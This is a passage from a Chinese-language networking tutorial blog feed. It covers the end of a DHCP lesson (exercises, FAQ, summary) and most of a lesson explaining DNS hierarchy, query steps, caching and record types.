</span>定期扫描DHCP服务器<br></code></pre></td></tr></table></figure><h3 id="7-3-DHCP-vs-静态IP">7.3 DHCP vs 静态IP</h3><p><strong>对比表</strong>：</p><table><thead><tr><th>特性</th><th>DHCP（动态）</th><th>静态IP</th></tr></thead><tbody><tr><td><strong>配置方式</strong></td><td>自动获取</td><td>手动配置</td></tr><tr><td><strong>易用性</strong></td><td>✅ 简单，即插即用</td><td>❌ 需要手动配置</td></tr><tr><td><strong>管理成本</strong></td><td>✅ 低，集中管理</td><td>❌ 高，逐台配置</td></tr><tr><td><strong>IP冲突</strong></td><td>✅ 自动避免</td><td>❌ 可能冲突</td></tr><tr><td><strong>稳定性</strong></td><td>⚠️ 依赖DHCP服务器</td><td>✅ 不依赖服务器</td></tr><tr><td><strong>IP固定</strong></td><td>❌ 可能变化</td><td>✅ 永久不变</td></tr><tr><td><strong>适用场景</strong></td><td>普通客户端、移动设备</td><td>服务器、网络设备</td></tr></tbody></table><p><strong>推荐策略</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">使用静态IP：<br><span class="hljs-bullet">- </span>服务器（Web、DNS、DHCP等）<br><span class="hljs-bullet">- </span>网络设备（路由器、交换机）<br><span class="hljs-bullet">- </span>打印机、网络摄像头<br><span class="hljs-bullet">- </span>需要端口映射的设备<br><br>使用DHCP：<br><span class="hljs-bullet">- </span>普通办公电脑<br><span class="hljs-bullet">- </span>笔记本电脑<br><span class="hljs-bullet">- </span>移动设备（手机、平板）<br><span class="hljs-bullet">- </span>访客设备<br><br>混合方案：<br><span class="hljs-bullet">- </span>DHCP + 保留地址（根据MAC分配固定IP）<br><span class="hljs-code">  优点：既自动配置，又IP固定</span><br></code></pre></td></tr></table></figure><hr><h2 id="8-今日练习">8. 今日练习</h2><h3 id="练习1：查看本机DHCP信息">练习1：查看本机DHCP信息</h3><p>在你的电脑上查看：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 当前IP地址<br><span class="hljs-bullet">2.</span> DHCP服务器地址<br><span class="hljs-bullet">3.</span> 租约开始时间<br><span class="hljs-bullet">4.</span> 租约结束时间<br><span class="hljs-bullet">5.</span> DNS服务器地址<br><span class="hljs-bullet">6.</span> 默认网关地址<br></code></pre></td></tr></table></figure><h3 id="练习2：释放和重新获取IP">练习2：释放和重新获取IP</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">步骤：<br><span class="hljs-bullet">1.</span> 记录当前IP地址<br><span class="hljs-bullet">2.</span> 释放IP地址（ipconfig /release）<br><span class="hljs-bullet">3.</span> 观察网络状态（无法上网）<br><span class="hljs-bullet">4.</span> 重新获取IP（ipconfig /renew）<br><span class="hljs-bullet">5.</span> 对比前后IP是否相同<br><span class="hljs-bullet">6.</span> 分析为什么相同/不同<br></code></pre></td></tr></table></figure><h3 id="练习3：计算租约时间">练习3：计算租约时间</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">已知：<br><span class="hljs-bullet">-</span> 租约开始：2024-01-15 14:00:00<br><span class="hljs-bullet">-</span> 租约时长：48小时<br><br>计算：<br><span class="hljs-bullet">1.</span> T1（续约时间）<br><span class="hljs-bullet">2.</span> T2（重绑时间）<br><span class="hljs-bullet">3.</span> 租约到期时间<br><span class="hljs-bullet">4.</span> 从开始到T1的间隔（秒）<br></code></pre></td></tr></table></figure><h3 id="练习4：DHCP抓包分析">练习4：DHCP抓包分析</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">使用Wireshark抓包：<br><span class="hljs-bullet">1.</span> 释放当前IP<br><span class="hljs-bullet">2.</span> 启动Wireshark，过滤 &quot;dhcp&quot;<br><span class="hljs-bullet">3.</span> 重新获取IP<br><span class="hljs-bullet">4.</span> 观察DORA四个报文<br><span class="hljs-bullet">5.</span> 分析每个报文的内容<br></code></pre></td></tr></table></figure><hr><h2 id="9-常见问题">9. 常见问题</h2><p><strong>Q1：为什么DHCP Request要广播而不是单播？</strong></p><p>A：两个原因：</p><ol><li>告诉所有DHCP服务器&quot;我选择了哪个offer&quot;，其他服务器可以回收IP</li><li>此时客户端还没有正式的IP，使用单播可能有问题</li></ol><p><strong>Q2：如果有多个DHCP服务器，会发生什么？</strong></p><p>A：</p><ul><li>客户端会收到多个Offer</li><li>客户端通常选择第一个收到的Offer</li><li>其他服务器看到Request后，会回收它们提供的IP</li></ul><p><strong>Q3：DHCP能跨网段工作吗？</strong></p><p>A：</p><ul><li>直接不能（广播无法跨越路由器）</li><li>需要配置DHCP Relay（中继代理）</li><li>路由器将广播转换为单播转发</li></ul><p><strong>Q4：租约到期后没有续约会怎样？</strong></p><p>A：</p><ul><li>IP地址被释放</li><li>客户端失去网络连接</li><li>需要重新发起DORA获取新IP</li><li>通常客户端会在到期前自动续约</li></ul><p><strong>Q5：为什么有时候IP地址会变化？</strong></p><p>A：可能原因：</p><ul><li>租约到期后获得不同的IP</li><li>DHCP服务器重启，地址池重置</li><li>长时间离线，原IP被分配给其他设备</li><li>更换了网络（连接不同的WiFi）</li></ul><hr><h2 id="10-总结">10. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点">核心知识点</h3><ol><li><p><strong>DHCP基础</strong>：</p><ul><li>动态主机配置协议</li><li>自动分配IP和网络参数</li><li>简化网络管理</li></ul></li><li><p><strong>DORA过程</strong>：</p><ul><li>Discover：寻找DHCP服务器</li><li>Offer：服务器提供IP</li><li>Request：客户端请求IP</li><li>Ack：服务器确认分配</li></ul></li><li><p><strong>租约管理</strong>：</p><ul><li>租约生命周期</li><li>T1续约（50%）、T2重绑（87.5%）</li><li>租约到期处理</li></ul></li><li><p><strong>DHCP报文</strong>：</p><ul><li>基于BOOTP协议</li><li>UDP端口67/68</li><li>丰富的Options字段</li></ul></li><li><p><strong>高级特性</strong>：</p><ul><li>DHCP中继（跨网段）</li><li>安全问题（欺骗、饿死攻击）</li><li>地址保留</li></ul></li></ol><h3 id="重点回顾">重点回顾</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">DHCP</span> <span class="hljs-operator">=</span> 自动网络配置<br>过程 <span class="hljs-operator">=</span> DORA（<span class="hljs-number">4</span>次握手）<br>管理 <span class="hljs-operator">=</span> 租约机制<br>安全 <span class="hljs-operator">=</span> DHCP Snooping<br><br>好处：<br>✅ 自动化配置<br>✅ 避免IP冲突<br>✅ 集中管理<br>✅ 提高效率<br></code></pre></td></tr></table></figure><h3 id="明天预告">明天预告</h3><p><strong>第14天：第二周总结与实战</strong></p><p>内容预览：</p><ul><li>本周知识串讲（Day 8-13）</li><li>IP、子网、MAC、端口、DNS、DHCP综合应用</li><li>综合项目：网络配置助手</li><li>知识测验</li></ul><hr><p><strong>继续加油！🚀</strong></p><p>今天我们深入学习了DHCP协议，理解了网络设备如何自动获取IP地址和配置。DHCP极大地简化了网络管理，是现代网络不可或缺的基础服务。掌握DHCP不仅能帮你理解网络自动化配置，还能在排查网络问题时快速定位。</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>12天：DNS协议详解</title>
    <link href="/2025/11/10/12%E5%A4%A9%EF%BC%9ADNS%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/10/12%E5%A4%A9%EF%BC%9ADNS%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1>第12天：DNS协议详解</h1><h2 id="今日目标">今日目标</h2><ul><li>理解DNS的工作原理和架构</li><li>掌握DNS查询过程</li><li>了解常见的DNS记录类型</li><li>学会使用Python实现DNS查询工具</li></ul><hr><h2 id="1-什么是DNS？">1. 什么是DNS？</h2><h3 id="1-1-DNS的定义">1.1 DNS的定义</h3><p><strong>DNS（Domain Name System，域名系统）</strong> 是互联网的&quot;电话簿&quot;。</p><p><strong>生活类比</strong>：</p><ul><li>你记得朋友的名字，但不记得他的电话号码</li><li>你查通讯录，通过名字找到电话号码</li><li>DNS就是这样一个通讯录，把域名翻译成IP地址</li></ul><p><strong>为什么需要DNS？</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">人类喜欢记忆：www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br>计算机需要使用：<span class="hljs-number">110.242</span>.<span class="hljs-number">68.66</span><br><br>DNS的作用：把域名转换为IP地址<br></code></pre></td></tr></table></figure><h3 id="1-2-DNS的重要性">1.2 DNS的重要性</h3><p><strong>如果没有DNS会怎样？</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">访问百度：http:<span class="hljs-comment">//110.242.68.66  ❌ 很难记</span><br>访问淘宝：http:<span class="hljs-comment">//106.11.248.146 ❌ 更难记</span><br>访问微信：http:<span class="hljs-comment">//101.32.118.25  ❌ 记不住</span><br><br>有了DNS：<br>访问百度：www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>  ✅ 容易记<br>访问淘宝：www<span class="hljs-selector-class">.taobao</span><span class="hljs-selector-class">.com</span> ✅ 好记<br>访问微信：www<span class="hljs-selector-class">.weixin</span><span class="hljs-selector-class">.com</span> ✅ 简单<br></code></pre></td></tr></table></figure><hr><h2 id="2-DNS架构体系">2. DNS架构体系</h2><h3 id="2-1-DNS层级结构">2.1 DNS层级结构</h3><p>DNS采用<strong>分布式、层级化</strong>的设计，就像一个倒置的树形结构：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                       .（根域）<br>                        |<span class="hljs-string"></span><br><span class="hljs-string">       +----------------+----------------+</span><br><span class="hljs-string">       </span>|<span class="hljs-string">                </span>|<span class="hljs-string">                </span>|<br>     com              cn               org<br>       |<span class="hljs-string">                </span>|<span class="hljs-string">                </span>|<br>  +----+----+      +----+----+      +----+----+<br>  |<span class="hljs-string">         </span>|<span class="hljs-string">      </span>|<span class="hljs-string">         </span>|<span class="hljs-string">      </span>|<span class="hljs-string">         </span>|<br>baidu    google  sina     163    wikipedia  linux<br>  |<span class="hljs-string">         </span>|<span class="hljs-string">      </span>|<span class="hljs-string">         </span>|<span class="hljs-string">        </span>|<span class="hljs-string">        </span>|<br> www       www    www       www      www      www<br></code></pre></td></tr></table></figure><p><strong>域名层级（从右到左）</strong>：</p><ol><li><p><strong>根域（Root Domain）</strong>：<code>.</code></p><ul><li>最顶层，通常被省略</li><li>全球只有13组根域名服务器</li></ul></li><li><p><strong>顶级域（TLD - Top Level Domain）</strong>：</p><ul><li>通用顶级域：<code>.com</code> <code>.net</code> <code>.org</code> <code>.edu</code> <code>.gov</code></li><li>国家顶级域：<code>.cn</code> <code>.us</code> <code>.uk</code> <code>.jp</code></li><li>新顶级域：<code>.tech</code> <code>.xyz</code> <code>.top</code></li></ul></li><li><p><strong>二级域（SLD - Second Level Domain）</strong>：</p><ul><li><code>baidu.com</code> 中的 <code>baidu</code></li><li><code>google.com</code> 中的 <code>google</code></li></ul></li><li><p><strong>三级域（子域）</strong>：</p><ul><li><code>www.baidu.com</code> 中的 <code>www</code></li><li><code>mail.google.com</code> 中的 <code>mail</code></li></ul></li></ol><p><strong>完整域名示例</strong>：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">www.baidu.com.<br> |<span class="hljs-string">   </span>|<span class="hljs-string">     </span>|<span class="hljs-string">  </span>|<br> |<span class="hljs-string">   </span>|<span class="hljs-string">     </span>|<span class="hljs-string">  +-- 根域（通常省略）</span><br><span class="hljs-string"> </span>|<span class="hljs-string">   </span>|<span class="hljs-string">     +----- 顶级域</span><br><span class="hljs-string"> </span>|<span class="hljs-string">   +----------- 二级域</span><br><span class="hljs-string"> +--------------- 三级域（子域）</span><br></code></pre></td></tr></table></figure><h3 id="2-2-DNS服务器类型">2.2 DNS服务器类型</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌─────────────────────────────────────────┐<br>│         DNS服务器类型                     │<br>├─────────────────────────────────────────┤<br>│ <span class="hljs-number">1.</span> 根DNS服务器（Root DNS <span class="hljs-keyword">Server</span>）        │<br>│    - 全球<span class="hljs-number">13</span>组                            │<br>│    - 知道所有顶级域服务器的地址          │<br>│                                          │<br>│ <span class="hljs-number">2.</span> 顶级域DNS服务器（TLD DNS <span class="hljs-keyword">Server</span>）     │<br>│    - 管理 .com、.cn 等顶级域             │<br>│    - 知道所有注册域的权威服务器          │<br>│                                          │<br>│ <span class="hljs-number">3.</span> 权威DNS服务器（Authoritative DNS）    │<br>│    - 存储域名的真实IP地址                │<br>│    - 由域名所有者管理                    │<br>│                                          │<br>│ <span class="hljs-number">4.</span> 本地DNS服务器（<span class="hljs-keyword">Local</span> DNS <span class="hljs-keyword">Server</span>）     │<br>│    - 通常由ISP提供                       │<br>│    - 缓存查询结果                        │<br>│    - 代替客户端执行递归查询              │<br>└─────────────────────────────────────────┘<br></code></pre></td></tr></table></figure><hr><h2 id="3-DNS查询过程">3. DNS查询过程</h2><h3 id="3-1-递归查询-vs-迭代查询">3.1 递归查询 vs 迭代查询</h3><p><strong>递归查询（Recursive Query）</strong>：</p><ul><li>客户端发出请求后，DNS服务器负责完成所有查询</li><li>“帮我查到结果再告诉我”</li></ul><p><strong>迭代查询（Iterative Query）</strong>：</p><ul><li>DNS服务器只返回下一步应该查询的服务器地址</li><li>“我不知道，但你可以去问XX服务器”</li></ul><h3 id="3-2-完整的DNS查询流程">3.2 完整的DNS查询流程</h3><p><strong>场景</strong>：你在浏览器输入 <code>www.example.com</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs stylus">步骤<span class="hljs-number">1</span>：检查本地缓存<br>─────────────────────────<br><span class="hljs-selector-attr">[你的电脑]</span><br>  ↓<br>先查看本地DNS缓存<br>  ↓<br>如果有缓存 → 直接返回IP ✅<br>如果没有 → 继续查询<br><br>步骤<span class="hljs-number">2</span>：查询本地DNS服务器<br>─────────────────────────<br><span class="hljs-selector-attr">[你的电脑]</span> → <span class="hljs-selector-attr">[本地DNS服务器]</span><br>               （通常是运营商的DNS）<br>  ↓<br>检查缓存<br>  ↓<br>如果有 → 返回IP ✅<br>如果没有 → 开始递归查询<br><br>步骤<span class="hljs-number">3</span>：查询根DNS服务器<br>─────────────────────────<br><span class="hljs-selector-attr">[本地DNS]</span> → <span class="hljs-selector-attr">[根DNS服务器]</span><br>问：www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> 的IP是多少？<br>答：我不知道，但 <span class="hljs-selector-class">.com</span> 的地址我知道，去问它<br><br>步骤<span class="hljs-number">4</span>：查询顶级域DNS服务器<br>─────────────────────────<br><span class="hljs-selector-attr">[本地DNS]</span> → <span class="hljs-selector-attr">[.com DNS服务器]</span><br>问：www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> 的IP是多少？<br>答：我不知道，但 example<span class="hljs-selector-class">.com</span> 的权威DNS我知道，去问它<br><br>步骤<span class="hljs-number">5</span>：查询权威DNS服务器<br>─────────────────────────<br><span class="hljs-selector-attr">[本地DNS]</span> → <span class="hljs-selector-attr">[example.com 权威DNS]</span><br>问：www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> 的IP是多少？<br>答：<span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span> ✅<br><br>步骤<span class="hljs-number">6</span>：返回结果并缓存<br>─────────────────────────<br><span class="hljs-selector-attr">[本地DNS]</span> → <span class="hljs-selector-attr">[你的电脑]</span><br>返回：<span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br>并且缓存结果（TTL时间内有效）<br></code></pre></td></tr></table></figure><p><strong>时间流程图</strong>：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">时间轴：<br>─────────────────────────────────────────────────<br><span class="hljs-symbol">t0:</span> 用户输入 www.example.com<br>    ↓<br><span class="hljs-symbol">t1:</span> 查询本地缓存（<span class="hljs-number">1</span>ms）<br>    ↓<br><span class="hljs-symbol">t2:</span> 查询本地DNS服务器（<span class="hljs-number">5</span>ms）<br>    ↓<br><span class="hljs-symbol">t3:</span> 本地DNS查询根服务器（<span class="hljs-number">50</span>ms）<br>    ↓<br><span class="hljs-symbol">t4:</span> 本地DNS查询.com服务器（<span class="hljs-number">30</span>ms）<br>    ↓<br><span class="hljs-symbol">t5:</span> 本地DNS查询权威服务器（<span class="hljs-number">20</span>ms）<br>    ↓<br><span class="hljs-symbol">t6:</span> 返回结果给用户（<span class="hljs-number">5</span>ms）<br>    ↓<br>总耗时：约 <span class="hljs-number">111</span>ms<br></code></pre></td></tr></table></figure><h3 id="3-3-DNS缓存机制">3.3 DNS缓存机制</h3><p><strong>多级缓存</strong>：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">1</span>. 浏览器缓存<br>   ├── <span class="hljs-params">Chrome:</span> chrome:<span class="hljs-operator">//</span>net-internals<span class="hljs-operator">/</span><span class="hljs-comment">#dns</span><br>   ├── <span class="hljs-params">Firefox:</span> about:networking<span class="hljs-comment">#dns</span><br>   └── 缓存时间：通常几分钟<br><br><span class="hljs-number">2</span>. 操作系统缓存<br>   ├── <span class="hljs-params">Windows:</span> ipconfig <span class="hljs-symbol">/displaydns</span><br>   ├── <span class="hljs-params">Linux:</span> nscd<br>   └── 缓存时间：根据TTL<br><br><span class="hljs-number">3</span>. 路由器缓存<br>   └── 家庭网关会缓存DNS结果<br><br><span class="hljs-number">4</span>. 本地DNS服务器缓存<br>   └── ISP的DNS服务器<br>   └── 缓存时间：根据TTL<br><br><span class="hljs-number">5</span>. 权威DNS服务器<br>   └── 最终的真实数据源<br></code></pre></td></tr></table></figure><p><strong>TTL（Time To Live）</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">DNS记录都有TTL值，表示缓存有效期<br><br>示例：<br>www.example.com.  300  IN  A  93.184.216.34<br><span class="hljs-code">                   ↑</span><br><span class="hljs-code">                  TTL = 300秒（5分钟）</span><br><span class="hljs-code"></span><br>含义：<br><span class="hljs-bullet">-</span> 这条记录可以被缓存5分钟<br><span class="hljs-bullet">-</span> 5分钟后需要重新查询<br><span class="hljs-bullet">-</span> TTL短：更新快，但查询频繁<br><span class="hljs-bullet">-</span> TTL长：查询少，但更新慢<br></code></pre></td></tr></table></figure><hr><h2 id="4-DNS记录类型">4. DNS记录类型</h2><h3 id="4-1-常见DNS记录类型">4.1 常见DNS记录类型</h3><table><thead><tr><th>记录类型</th><th>全称</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td><strong>A</strong></td><td>Address</td><td>IPv4地址</td><td><code>www.example.com → 93.184.216.34</code></td></tr><tr><td><strong>AAAA</strong></td><td>IPv6 Address</td><td>IPv6地址</td><td><code>www.example.com → 2606:2800:220:1:...</code></td></tr><tr><td><strong>CNAME</strong></td><td>Canonical Name</td><td>别名</td><td><code>blog.example.com → www.example.com</code></td></tr><tr><td><strong>MX</strong></td><td>Mail Exchange</td><td>邮件服务器</td><td><code>example.com → mail.example.com</code></td></tr><tr><td><strong>NS</strong></td><td>Name Server</td><td>域名服务器</td><td><code>example.com → ns1.example.com</code></td></tr><tr><td><strong>TXT</strong></td><td>Text</td><td>文本信息</td><td><code>SPF、DKIM等验证信息</code></td></tr><tr><td><strong>PTR</strong></td><td>Pointer</td><td>反向解析</td><td><code>34.216.184.93.in-addr.arpa → www.example.com</code></td></tr><tr><td><strong>SOA</strong></td><td>Start of Authority</td><td>授权起始</td><td>域的管理信息</td></tr><tr><td><strong>SRV</strong></td><td>Service</td><td>服务位置</td><td>特定服务的主机和端口</td></tr></tbody></table><h3 id="4-2-记录类型详解">4.2 记录类型详解</h3><p><strong>A记录（最常用）</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">用途：将域名解析为IPv4地址<br><br>配置示例：<br>www.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">93.184.216.34</span><br>api.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">93.184.216.35</span><br>cdn.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">104.16.132.229</span><br><br>一个域名可以有多个<span class="hljs-keyword">A</span>记录（负载均衡）：<br>www.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">93.184.216.34</span><br>www.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">93.184.216.35</span><br>www.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">A</span>  <span class="hljs-number">93.184.216.36</span><br></code></pre></td></tr></table></figure><p><strong>AAAA记录</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">用途：将域名解析为IPv6地址<br><br>配置示例：<br>www.example.com.    <span class="hljs-keyword">IN</span>  <span class="hljs-keyword">AAAA</span>  <span class="hljs-number">2606:2800:220:1:248:1893:25c8:1946</span><br></code></pre></td></tr></table></figure><p><strong>CNAME记录</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">用途：创建域名别名<br><br>配置示例：<br>www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.     IN  A      <span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br>blog<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.    IN  CNAME  www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br>forum<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.   IN  CNAME  www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br><br>解析过程：<br>用户访问 blog<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>  ↓ CNAME<br>指向 www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>  ↓ A记录<br>解析为 <span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br><br>注意：CNAME不能与其他记录共存<br></code></pre></td></tr></table></figure><p><strong>MX记录</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus">用途：指定邮件服务器<br><br>配置示例：<br>example<span class="hljs-selector-class">.com</span>.    IN  MX  <span class="hljs-number">10</span>  mail1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br>example<span class="hljs-selector-class">.com</span>.    IN  MX  <span class="hljs-number">20</span>  mail2<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br>                      ↑<br>                   优先级（越小越优先）<br><br>邮件发送过程：<br>发送到 user@example<span class="hljs-selector-class">.com</span><br>  ↓<br>查询 example<span class="hljs-selector-class">.com</span> 的 MX记录<br>  ↓<br>找到 mail1<span class="hljs-selector-class">.example</span>.com（优先级<span class="hljs-number">10</span>）<br>  ↓<br>查询 mail1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> 的 A记录<br>  ↓<br>获得邮件服务器IP，发送邮件<br></code></pre></td></tr></table></figure><p><strong>NS记录</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">用途：指定域名服务器<br><br>配置示例：<br>example<span class="hljs-selector-class">.com</span>.    IN  NS  ns1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br>example<span class="hljs-selector-class">.com</span>.    IN  NS  ns2<span class="hljs-selector-class">.example</span><span 